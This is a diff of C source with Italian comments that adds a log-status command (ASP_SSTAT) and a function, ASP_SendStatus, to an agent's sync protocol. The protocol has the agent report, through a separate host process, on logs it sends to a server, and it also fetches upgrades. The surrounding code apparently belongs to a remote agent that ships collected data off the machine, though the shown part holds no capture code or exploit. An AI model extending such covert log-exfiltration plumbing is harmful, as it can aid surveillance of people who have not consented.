@@ -52,6 +52,7 @@ ASPThreadDataStruct ASPThreadData;
 #define ASP_SLOG  8   // Invia un log al server
 #define ASP_UPGR  9   // Prende un upgrade
 #define ASP_BYE   10  // Chiude la sessione
+#define ASP_SSTAT 11  // Invia info sui log che sta per spedire
 
 // XXXXX da definire....
 #define MAX_ASP_IN_PARAM 1024
@@ -1185,7 +1186,12 @@ void __stdcall  ASP_MainLoop(char *asp_server)
 			ret_success = H_ASP_GenericCommand(PROTO_FILESYSTEM, &ASP_IPC_command->out_command, &message, &msg_len);
 			ASP_REPORT_MESSAGE_BACK;
 
+		} else if (ASP_IPC_command->action == ASP_SSTAT) {
+			ret_success = H_ASP_GenericCommandPL(PROTO_LOGSTATUS, ASP_IPC_command->in_param, sizeof(asp_request_stat), &ASP_IPC_command->out_command, &message, &msg_len);
+			SAFE_FREE(message);
+
 		}
+
 
 		// Notifica la fine delle operazioni di lettura/scrittura
 		if (ret_success)
@@ -1493,6 +1499,32 @@ BOOL ASP_SendLog(char *file_name, DWORD byte_per_second)
 		return FALSE;
 
 	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
+	if (ASP_IPC_command->out_command != PROTO_OK)
+		return FALSE;
+
+	return TRUE;
+}
+
+// Manda lo status dei log da spedire
+// Prende in input numero e size dei log (qword)
+BOOL ASP_SendStatus(UINT64 log_count, UINT64 log_size)
+{
+	asp_request_stat *rs;
+
+	// Controlla che il processo host ASP sia ancora aperto e che non stia
+	// gia' eseguendo delle operazioni
+	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
+		return FALSE;
+
+	ASP_IPC_command->action = ASP_SSTAT;
+	rs  = (asp_request_stat *)ASP_IPC_command->in_param;
+	rs->log_count = log_count;
+	rs->log_size = log_size;
+	ASP_IPC_command->status = ASP_FETCH;
+
+	if (!ASP_Wait_Response())
+		return FALSE;
+
 	if (ASP_IPC_command->out_command != PROTO_OK)
 		return FALSE;
 
